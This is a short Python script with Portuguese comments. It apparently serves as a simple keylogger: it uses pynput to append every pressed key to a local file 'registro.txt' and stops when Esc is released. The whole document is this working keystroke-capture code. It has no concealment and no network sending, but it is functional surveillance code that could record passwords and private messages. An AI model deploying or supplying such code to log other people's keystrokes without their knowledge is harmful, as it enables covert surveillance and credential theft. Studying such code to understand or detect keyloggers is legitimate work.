from pynput import keyboard

#criando o arquivo de log "registro.txt":
def ao_pressionar(tecla):
    try:
        with open("registro.txt", "a") as arquivo_log:
            arquivo_log.write(f"{tecla.char}")
    except AttributeError:
        with open("registro.txt", "a") as arquivo_log:
            arquivo_log.write(f"{tecla}")

#parar a leitura:
def ao_soltar(tecla):
    if tecla == keyboard.Key.esc:
        return False

#recebe as teclas:
with keyboard.Listener(
        on_press=ao_pressionar,
        on_release=ao_soltar) as leitura:
    leitura.join()